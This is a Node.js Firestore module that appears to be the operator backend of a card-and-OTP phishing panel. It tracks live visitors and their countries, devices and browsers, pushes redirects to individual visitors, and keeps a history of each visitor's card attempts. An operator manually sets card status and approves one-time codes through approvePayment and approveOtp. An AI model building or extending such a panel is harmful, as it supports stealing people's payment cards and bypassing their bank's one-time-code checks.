const { getFirestore } = require('./firebase-config');

async function getAllVisitors() {
    try {
        const db = getFirestore();
        const snapshot = await db.collection('visitors')
            .orderBy('lastUpdated', 'desc')
            .get();
        
        const visitors = [];
        snapshot.forEach(doc => {
            visitors.push(doc.data());
        });
        
        return { success: true, visitors, count: visitors.length };
    } catch (error) {
        console.error('getAllVisitors error:', error);
        return { success: false, error: error.message };
    }
}

async function getVisitorById(vid) {
    try {
        const db = getFirestore();
        const doc = await db.collection('visitors').doc(vid).get();
        
        if (!doc.exists) {
            return { success: false, error: 'Visitor not found' };
        }
        
        return { success: true, visitor: doc.data() };
    } catch (error) {
        console.error('getVisitorById error:', error);
        return { success: false, error: error.message };
    }
}

async function getOnlineVisitors() {
    try {
        const db = getFirestore();
        const snapshot = await db.collection('visitors')
            .where('online', '==', true)
            .orderBy('lastUpdated', 'desc')
            .get();
        
        const visitors = [];
        snapshot.forEach(doc => {
            visitors.push(doc.data());
        });
        
        return { success: true, visitors, count: visitors.length };
    } catch (error) {
        console.error('getOnlineVisitors error:', error);
        return { success: false, error: error.message };
    }
}

async function redirectVisitor(vid, targetPage) {
    try {
        const db = getFirestore();
        await db.collection('visitors').doc(vid).update({
            redirect: {
                targetPage: targetPage,
                timestamp: new Date().toISOString(),
                executed: false
            }
        });
        
        return { success: true };
    } catch (error) {
        console.error('redirectVisitor error:', error);
        return { success: false, error: error.message };
    }
}

async function checkRedirect(vid) {
    try {
        const db = getFirestore();
        const doc = await db.collection('visitors').doc(vid).get();
        
        if (!doc.exists) {
            return { success: false, error: 'Visitor not found' };
        }
        
        const data = doc.data();
        if (data.redirect && !data.redirect.executed) {
            await db.collection('visitors').doc(vid).update({
                'redirect.executed': true
            });
            
            return { success: true, redirect: data.redirect };
        }
        
        return { success: true, redirect: null };
    } catch (error) {
        console.error('checkRedirect error:', error);
        return { success: false, error: error.message };
    }
}

async function approvePayment(vid, card_status) {
    try {
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        const doc = await docRef.get();
        
        if (!doc.exists) {
            return { success: false, error: 'Visitor not found' };
        }
        
        const data = doc.data();
        const updates = {
            'payment.card_status': card_status,
            'payment.statusUpdatedAt': timestamp,
            'lastUpdated': timestamp
        };
        
        if (data.payment && data.payment.current) {
            const historyCount = data.payment.history ? Object.keys(data.payment.history).length : 0;
            const attemptKey = `payment.history.attempt_${historyCount + 1}`;
            
            updates[attemptKey] = {
                ...data.payment.current,
                card_status: card_status,
                statusUpdatedAt: timestamp
            };
        }
        
        await docRef.update(updates);
        
        return { success: true };
    } catch (error) {
        console.error('approvePayment error:', error);
        return { success: false, error: error.message };
    }
}

async function approveOtp(vid, approved) {
    try {
        const db = getFirestore();
        await db.collection('visitors').doc(vid).update({
            'otp.approved': approved,
            'otp.approvedAt': new Date().toISOString(),
            'lastUpdated': new Date().toISOString()
        });
        
        return { success: true };
    } catch (error) {
        console.error('approveOtp error:', error);
        return { success: false, error: error.message };
    }
}

async function getPaymentStatus(vid) {
    try {
        const db = getFirestore();
        const doc = await db.collection('visitors').doc(vid).get();
        
        if (!doc.exists) {
            return { success: false, error: 'Visitor not found' };
        }
        
        const data = doc.data();
        if (data.payment && data.payment.card_status) {
            return { success: true, card_status: data.payment.card_status };
        }
        
        return { success: true, card_status: 'pending' };
    } catch (error) {
        console.error('getPaymentStatus error:', error);
        return { success: false, error: error.message };
    }
}

async function getStatistics() {
    try {
        const db = getFirestore();
        const snapshot = await db.collection('visitors').get();
        
        const stats = {
            total: 0,
            online: 0,
            countries: {},
            devices: {},
            browsers: {}
        };
        
        snapshot.forEach(doc => {
            const data = doc.data();
            stats.total++;
            
            if (data.online) stats.online++;
            
            if (data.country) {
                stats.countries[data.country] = (stats.countries[data.country] || 0) + 1;
            }
            
            if (data.device) {
                stats.devices[data.device] = (stats.devices[data.device] || 0) + 1;
            }
            
            if (data.browser) {
                const browserName = data.browser.split(' ')[0];
                stats.browsers[browserName] = (stats.browsers[browserName] || 0) + 1;
            }
        });
        
        return { success: true, stats };
    } catch (error) {
        console.error('getStatistics error:', error);
        return { success: false, error: error.message };
    }
}

module.exports = {
    getAllVisitors,
    getVisitorById,
    getOnlineVisitors,
    redirectVisitor,
    checkRedirect,
    approvePayment,
    approveOtp,
    getStatistics,
    getPaymentStatus
};
